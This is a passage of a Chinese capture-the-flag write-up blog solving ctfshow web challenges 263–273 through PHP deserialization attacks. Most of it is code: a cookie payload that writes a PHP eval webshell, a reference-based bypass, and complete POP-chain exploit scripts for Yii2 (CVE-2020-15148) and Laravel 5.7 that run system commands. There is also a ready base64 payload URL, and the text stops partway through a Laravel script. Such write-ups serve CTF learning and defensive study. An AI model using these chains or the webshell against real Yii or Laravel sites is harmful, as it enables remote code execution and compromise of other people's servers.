class="line">document.cookie=&#x27;limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyODoiPD9waHAgZXZhbCgkX1BPU1RbS2kxcm9dKSA/PiI7czo2OiJzdGF0dXMiO3M6Njoi5oiQ5YqfIjt9&#x27;</span><br></pre></td></tr></table></figure><ul><li><p>c.再访问inc&#x2F;inc.php触发会话，将shell写入log-1.php</p></li><li><p>d.最后访问log-c.php传参获取flag</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST Ki1ro=system(&quot;tac flag.php&quot;)</span><br></pre></td></tr></table></figure><h1 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h1><p>和262相比没有自动setcookie，因此我们需要额外传递cookie的msg</p><h1 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h1><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061370021.png"></p><p>要用引用绕过</p><h3 id="引用绕过的基本原理"><a href="#引用绕过的基本原理" class="headerlink" title="引用绕过的基本原理"></a><strong>引用绕过的基本原理</strong></h3><p>在PHP中，序列化字符串可以通过 <code>R</code> 或 <code>r</code> 符号表示对象或变量的引用关系。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 示例对象 </span><br><span class="line">class Test &#123; </span><br><span class="line">    public $a; </span><br><span class="line">    public $b; </span><br><span class="line">    &#125; </span><br><span class="line">$obj = new Test(); </span><br><span class="line">$obj-&gt;a = 123; </span><br><span class="line">$obj-&gt;b = &amp;$obj-&gt;a; // $b 是 $a 的引用`</span><br><span class="line"></span><br><span class="line">序列化后的字符串会包含引用标识：</span><br><span class="line"></span><br><span class="line">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;i:123;s:1:&quot;b&quot;;R:2;&#125; # R:2 表示引用第二个存储位置的值</span><br></pre></td></tr></table></figure><p>当反序列化时，修改 <code>$a</code> 的值会自动影响 <code>$b</code>，从而绕过某些基于属性值的校验逻辑</p><p><code>payload: ?ctfshow=O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;s:1:&quot;a&quot;;s:8:&quot;password&quot;;R:2;&#125;</code></p><h1 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h1><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061391808.png"></p><p>构造一个ctfshow的类就行，当php产生非语法错误报错时, 程序立即停止而__destruct也不会执行，这里用大写绕过即可<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061407375.png"></p><h1 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h1><p>yii反序列化漏洞</p><p><a href="https://blog.csdn.net/cosmoslin/article/details/120612714">yii反序列化漏洞复现及利用_yii框架漏洞-CSDN博客</a></p><p>CVE-2020-15148 的反序列化起点在 <code>vendor/yiisoft/yii2/db/BatchQueryResult.php</code> 中<br>这里 <code>__destruct()</code> 方法会调用 <code>reset()</code> 方法，而 <code>reset()</code> 方法中的参数 <code>$this-&gt;_dataReader</code> 是可控的，进一步调用该参数的 <code>close()</code> 方法，漏洞点就在于此可以作为跳板来利用 <code>__call()</code> 方法执行反序列化操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * Destructor.</span><br><span class="line">     */</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        // make sure cursor is closed</span><br><span class="line">        $this-&gt;reset();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Resets the batch query.</span><br><span class="line">     * This method will clean up the existing batch query so that a new batch query can be performed.</span><br><span class="line">     */</span><br><span class="line">    public function reset()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;_dataReader !== null) &#123;</span><br><span class="line">            $this-&gt;_dataReader-&gt;close();</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;_dataReader = null;</span><br><span class="line">        $this-&gt;_batch = null;</span><br><span class="line">        $this-&gt;_value = null;</span><br><span class="line">        $this-&gt;_key = null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>正常来说跟进<code>close()</code>方法，但没有找到利用点。但是这里<code>_dataReader</code>是可控的，可以通过触发<code>__call</code>方法来进行利用。</p><p>当一个对象调用不可访问的<code>close</code>方法或者类中没有<code>close</code>方法，即可触发<code>__call</code>。全局搜索一下__call方法，在<code>\vendor\fzaninotto\faker\src\Faker\Generator.php</code>存在合适的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __call($method, $attributes)</span><br><span class="line">   &#123;</span><br><span class="line">       return $this-&gt;format($method, $attributes);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>继续跟进format方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function format($formatter, $arguments = array())</span><br><span class="line">    &#123;</span><br><span class="line">        return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>call_user_func_array</code>：调用回调函数，并把一个数组参数作为回调函数的参数</p><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array(callable $callback, array $param_arr): mixed </span><br><span class="line">callback</span><br><span class="line">    被调用的回调函数。</span><br><span class="line">param_arr</span><br><span class="line">    要被传入回调函数的数组，这个数组得是索引数组。</span><br></pre></td></tr></table></figure><p>跟进getFormatter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public function getFormatter($formatter)</span><br><span class="line">    &#123;</span><br><span class="line">        if (isset($this-&gt;formatters[$formatter])) &#123;</span><br><span class="line">            return $this-&gt;formatters[$formatter];</span><br><span class="line">        &#125;</span><br><span class="line">        foreach ($this-&gt;providers as $provider) &#123;</span><br><span class="line">            if (method_exists($provider, $formatter)) &#123;</span><br><span class="line">                $this-&gt;formatters[$formatter] = array($provider, $formatter);</span><br><span class="line"></span><br><span class="line">                return $this-&gt;formatters[$formatter];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        throw new \InvalidArgumentException(sprintf(&#x27;Unknown formatter &quot;%s&quot;&#x27;, $formatter));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>因为this-&gt;formatters是可控的，因此getFormatter方法的返回值也是我们可控的，因此call_user_func_array(this-&gt;getFormatter(formatter), arguments);中，第一个参数可控，第二个参数为空。</p><p>这一步就需要一个执行类，这时需要类中的方法需要满足两个条件</p><p>方法所需的参数只能是其自己类中存在的（即参数：$this-&gt;args） 方法需要有命令执行功能 查找调用了call_user_func函数的无参方法。</p><p>call_user_func：把第一个参数作为回调函数调用,这里用call_user_func即可达到命令执行的效果也可以达到RCE的效果</p><p>构造正则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</span><br></pre></td></tr></table></figure><p>其中有两个类中的<code>run</code>方法可用：</p><p><code>yii\rest\CreateAction::run()</code>，<code>$this-&gt;checkAccess, $this-&gt;id</code>两个参数可控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function run()</span><br><span class="line">&#123;</span><br><span class="line">    if ($this-&gt;checkAccess) &#123;</span><br><span class="line">        call_user_func($this-&gt;checkAccess, $this-&gt;id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    return $model;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>\yii\rest\IndexAction::run()</code>，<code>$this-&gt;checkAccess, $this-&gt;id</code>两个参数可控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function run()</span><br><span class="line">&#123;</span><br><span class="line">    if ($this-&gt;checkAccess) &#123;</span><br><span class="line">        call_user_func($this-&gt;checkAccess, $this-&gt;id);</span><br><span class="line">    &#125;</span><br><span class="line">    return $this-&gt;prepareDataProvider();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此可以构造pop链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct()-&gt;reset()-&gt;close()</span><br><span class="line">↓↓↓</span><br><span class="line">Faker\Generator::__call()-&gt;format()-&gt;call_user_func_array()</span><br><span class="line">↓↓↓</span><br><span class="line">\yii\rest\IndexAction::run-&gt;call_user_func()</span><br></pre></td></tr></table></figure><p>poc1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class IndexAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;exec&#x27;;  //可执行的函数</span><br><span class="line">            $this-&gt;id = &#x27;cat /flag &gt; 1.txt&#x27;; //命令执行参数</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Faker &#123;</span><br><span class="line"></span><br><span class="line">    use yii\rest\IndexAction;</span><br><span class="line"></span><br><span class="line">    class Generator</span><br><span class="line">    &#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;formatters[&#x27;close&#x27;] = [new IndexAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\db&#123;</span><br><span class="line"></span><br><span class="line">    use Faker\Generator;</span><br><span class="line"></span><br><span class="line">    class BatchQueryResult&#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_dataReader=new Generator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line"></span><br><span class="line">    use yii\db\BatchQueryResult;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(serialize(new BatchQueryResult()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题实战，要先找到漏洞触发点BatchQueryResult</p><p>首先弱密码<code>admin/admin</code>登录</p><p>在about界面查看源码，有<code>&lt;!--?view-source --&gt;</code>提示</p><p>尝试访问：<code>index.php?r=site%2Fabout&amp;view-source</code>，路由介绍：<a href="https://www.yiichina.com/doc/guide/2.0/runtime-routing">yii路由</a></p><p>发现一个反序列化入口点：<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061440491.png"></p><p>poc如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class IndexAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;shell_exec&#x27;;</span><br><span class="line">            $this-&gt;id = &#x27;cat /flag &gt; 1.txt&#x27;;                //命令执行</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Faker &#123;</span><br><span class="line"></span><br><span class="line">    use yii\rest\IndexAction;</span><br><span class="line"></span><br><span class="line">    class Generator</span><br><span class="line">    &#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;formatters[&#x27;close&#x27;] = [new IndexAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\db&#123;</span><br><span class="line"></span><br><span class="line">    use Faker\Generator;</span><br><span class="line"></span><br><span class="line">    class BatchQueryResult&#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_dataReader=new Generator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line"></span><br><span class="line">    use yii\db\BatchQueryResult;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(serialize(new BatchQueryResult()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload为</p><p><code>index.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxNzoiY2F0IC9mbGFnID4gMS50eHQiO31pOjE7czozOiJydW4iO319fX0=</code></p><p>之后访问1.txt即可<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061455968.png"></p><h1 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h1><p>换一个poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class IndexAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;exec&#x27;;</span><br><span class="line">            $this-&gt;id = &#x27;cat /flags |tee 1.txt&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Faker &#123;</span><br><span class="line"></span><br><span class="line">    use yii\rest\IndexAction;</span><br><span class="line"></span><br><span class="line">    class Generator</span><br><span class="line">    &#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;formatters[&#x27;isRunning&#x27;] = [new IndexAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Codeception\Extension&#123;</span><br><span class="line"></span><br><span class="line">    use Faker\Generator;</span><br><span class="line"></span><br><span class="line">    class RunProcess</span><br><span class="line">    &#123;</span><br><span class="line">        private $processes = [];</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;processes[]=new Generator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line"></span><br><span class="line">    use Codeception\Extension\RunProcess;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(serialize(new RunProcess()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="web-269-270"><a href="#web-269-270" class="headerlink" title="web 269 270"></a>web 269 270</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace yii\rest &#123;</span><br><span class="line">    class Action</span><br><span class="line">    &#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">    &#125;</span><br><span class="line">    class IndexAction</span><br><span class="line">    &#123;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;checkAccess = $func;</span><br><span class="line">            $this-&gt;id = $param;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\web &#123;</span><br><span class="line">    abstract class MultiFieldSession</span><br><span class="line">    &#123;</span><br><span class="line">        public $writeCallback;</span><br><span class="line">    &#125;</span><br><span class="line">    class DbSession extends MultiFieldSession</span><br><span class="line">    &#123;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;writeCallback = [new \yii\rest\IndexAction($func, $param), &quot;run&quot;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\db &#123;</span><br><span class="line">    use yii\base\BaseObject;</span><br><span class="line">    class BatchQueryResult</span><br><span class="line">    &#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_dataReader = new \yii\web\DbSession($func, $param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace &#123;</span><br><span class="line">    $exp = new \yii\db\BatchQueryResult(&#x27;shell_exec&#x27;, &#x27;cp /f* 1.txt&#x27;); //命令执行</span><br><span class="line">    echo(base64_encode(serialize($exp)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h1><p>题目<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061472610.png"></p><p>laravel5.7反序列化漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Illuminate\Foundation\Testing&#123;</span><br><span class="line">    class PendingCommand&#123;</span><br><span class="line">        protected $command;</span><br><span class="line">        protected $parameters;</span><br><span class="line">        protected $app;</span><br><span class="line">        public $test;</span><br><span class="line">        public function __construct($command, $parameters,$class,$app)&#123;</span><br><span class="line">            $this-&gt;command = $command;</span><br><span class="line">            $this-&gt;parameters = $parameters;</span><br><span class="line">            $this-&gt;test=$class;</span><br><span class="line">            $this-&gt;app=$app;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Illuminate\Auth&#123;</span><br><span class="line">    class GenericUser&#123;</span><br><span class="line">        protected $attributes;</span><br><span class="line">        public function __construct(array $attributes)&#123;</span><br><span class="line">            $this-&gt;attributes = $attributes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Illuminate\Foundation&#123;</span><br><span class="line">    class Application&#123;</span><br><span class="line">        protected $hasBeenBootstrapped = false;</span><br><span class="line">        protected $bindings;</span><br><span class="line">        public function __construct($bind)&#123;</span><br><span class="line">            $this-&gt;bindings=$bind;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    $genericuser = new Illuminate\Auth\GenericUser(</span><br><span class="line">        array(</span><br><span class="line">            &quot;expectedOutput&quot;=&gt;array(&quot;0&quot;=&gt;&quot;1&quot;),</span><br><span class="line">            &quot;expectedQuestions&quot;=&gt;array(&quot;0&quot;=&gt;&quot;1&quot;)</span><br><span class="line">             )</span><br><span class="line">    );</span><br><span class="line">    $application = new Illuminate\Foundation\Application(</span><br><span class="line">        array(</span><br><span class="line">            &quot;Illuminate\Contracts\Console\Kernel&quot;=&gt;</span><br><span class="line">                array(</span><br><span class="line">                    &quot;concrete&quot;=&gt;&quot;Illuminate\Foundation\Application&quot;</span><br><span class="line">                     )</span><br><span class="line">             )</span><br><span class="line">    );</span><br><span class="line">    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">        &quot;system&quot;,array(&#x27;cat /flag&#x27;),   //命令执行</span><br><span class="line">        $genericuser,</span><br><span class="line">        $application</span><br><span class="line">    );</span><br><span class="line">    echo urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="web272-273"><a href="#web272-273" class="headerlink" title="web272,273"></a>web272,273</h1><p>同样是laravel的漏洞</p><p>有两个payload可用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">//payload1</span><br><span class="line">&lt;?php</span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line"></span><br><span class="line">    use Illuminate\Bus\Dispatcher;</span><br><span class="line">    use Illuminate\Foundation\Console\QueuedCommand;</span><br><span class="line"></span><br><span class="line">    class PendingBroadcast</span><br><span class="line">    &#123;</span><br><span class="line">        protected $events;</span><br><span class="line">        protected $event;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;events=new Dispatcher();</span><br><span class="line">            $this-&gt;event=new QueuedCommand();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Illuminate\Foundation\Console&#123;</span><br><span class="line"></span><br><span class="line">   